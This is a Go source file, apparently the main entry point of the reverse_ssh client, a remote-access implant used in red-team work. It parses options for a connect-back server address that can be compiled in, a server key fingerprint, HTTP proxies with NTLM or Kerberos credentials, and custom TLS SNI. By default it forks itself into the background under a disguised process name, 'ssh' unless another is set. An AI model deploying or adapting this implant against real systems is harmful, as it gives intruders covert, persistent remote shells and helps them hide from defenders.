package main

import (
	"fmt"
	"io"
	"log"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"syscall"

	"github.com/NHAS/reverse_ssh/internal/client"
	"github.com/NHAS/reverse_ssh/internal/terminal"
	"github.com/NHAS/reverse_ssh/pkg/logger"
)

func fork(path string, sysProcAttr *syscall.SysProcAttr, pretendArgv ...string) error {

	cmd := exec.Command(path)
	cmd.Args = pretendArgv
	cmd.Env = append(os.Environ(), "F="+strings.Join(os.Args, " "))
	cmd.SysProcAttr = sysProcAttr

	err := cmd.Start()

	if cmd.Process != nil {
		cmd.Process.Release()
	}

	return err
}

var (
	destination string
	fingerprint string
	proxy       string
	ignoreInput string
	customSNI   string
	useKerberos bool
	process     string
	// golang can only embed strings using the compile time linker
	useKerberosStr string
	logLevel       string
	ntlmProxyCreds string
)

func printHelp() {
	fmt.Println("usage: ", filepath.Base(os.Args[0]), "--[foreground|fingerprint|proxy|process_name] -d|--destination <server_address>")
	fmt.Println("\t\t-d or --destination\tServer connect back address (can be baked in)")
	fmt.Println("\t\t--foreground\tCauses the client to run without forking to background")
	fmt.Println("\t\t--fingerprint\tServer public key SHA256 hex fingerprint for auth")
	fmt.Println("\t\t--proxy\tLocation of HTTP connect proxy to use")
	fmt.Println("\t\t--ntlm-proxy-creds\tNTLM proxy credentials in format DOMAIN\\USER:PASS")
	fmt.Println("\t\t--process_name\tProcess name shown in tasklist/process list")
	fmt.Println("\t\t--sni\tWhen using TLS set the clients requested SNI to this value")
	fmt.Println("\t\t--log-level\tChange logging output levels, [INFO,WARNING,ERROR,FATAL,DISABLED]")
	if runtime.GOOS == "windows" {
		fmt.Println("\t\t--host-kerberos\tUse kerberos authentication on proxy server (if proxy server specified)")
	}
}

func main() {
	useKerberos = useKerberosStr == "true"

	if len(os.Args) == 0 || ignoreInput == "true" {
		Run(destination, fingerprint, proxy, customSNI, useKerberos)
		return
	}

	os.Args[0] = strconv.Quote(os.Args[0])
	var argv = strings.Join(os.Args, " ")

	realArgv, child := os.LookupEnv("F")
	if child {
		argv = realArgv
	}

	os.Unsetenv("F")

	line := terminal.ParseLine(argv, 0)

	if line.IsSet("h") || line.IsSet("help") {
		printHelp()
		return
	}

	fg := line.IsSet("foreground")

	proxyaddress, _ := line.GetArgString("proxy")
	if len(proxyaddress) > 0 {
		proxy = proxyaddress
	}

	userSpecifiedFingerprint, err := line.GetArgString("fingerprint")
	if err == nil {
		fingerprint = userSpecifiedFingerprint
	}

	userSpecifiedSNI, err := line.GetArgString("sni")
	if err == nil {
		customSNI = userSpecifiedSNI
	}

	userSpecifiedNTLMCreds, err := line.GetArgString("ntlm-proxy-creds")
	if err == nil {
		if line.IsSet("host-kerberos") {
			log.Fatal("You cannot use both the host kerberos credentials and static ntlm proxy credentials at once. --host-kerberos and --ntlm-proxy-creds")
		}

		ntlmProxyCreds = userSpecifiedNTLMCreds
	} else if len(ntlmProxyCreds) > 0 {
		client.SetNTLMProxyCreds(ntlmProxyCreds)
	}
	var processArgv []string
	if process == "" {
		processArgv = append(processArgv, "ssh")
	} else {
		tmp := strings.Split(process, "_")
		if len(tmp) > 1 {
			processArgv = append(processArgv, strings.ReplaceAll(strings.Join(tmp, " "), "*", "-"))
		} else {
			processArgv = append(processArgv, process)
		}

	}

	if line.IsSet("host-kerberos") {
		useKerberos = true
	}

	if !(line.IsSet("d") || line.IsSet("destination")) && len(destination) == 0 && len(line.Arguments) < 1 {
		fmt.Println("No destination specified")
		printHelp()
		return
	}

	tempDestination, err := line.GetArgString("d")
	if err != nil {
		tempDestination, _ = line.GetArgString("destination")
	}

	if len(tempDestination) > 0 {
		destination = tempDestination
	}

	if len(destination) == 0 && len(line.Arguments) > 1 {
		// Basically take a guess at the arguments we have and take the last one
		destination = line.Arguments[len(line.Arguments)-1].Value()
	}

	var actualLogLevel logger.Urgency = logger.INFO
	userSpecifiedLogLevel, err := line.GetArgString("log-level")
	if err == nil {
		actualLogLevel, err = logger.StrToUrgency(userSpecifiedLogLevel)
		if err != nil {
			log.Fatalf("Invalid log level: %q, err: %s", userSpecifiedLogLevel, err)
		}
	} else if logLevel != "" {
		actualLogLevel, err = logger.StrToUrgency(logLevel)
		if err != nil {
			actualLogLevel = logger.INFO
			log.Println("Default log level as invalid, setting to INFO: ", err)
		}
	}
	logger.SetLogLevel(actualLogLevel)

	if len(destination) == 0 {
		fmt.Println("No destination specified")
		printHelp()
		return
	}

	if fg || child {
		Run(destination, fingerprint, proxy, customSNI, useKerberos)
		return
	}

	if strings.HasPrefix(destination, "stdio://") {
		// We cant fork off of an inetd style connection or stdin/out will be closed
		log.SetOutput(io.Discard)
		Run(destination, fingerprint, proxy, customSNI, useKerberos)
		return
	}

	err = Fork(destination, fingerprint, proxy, customSNI, useKerberos, processArgv...)
	if err != nil {
		Run(destination, fingerprint, proxy, customSNI, useKerberos)
	}

}
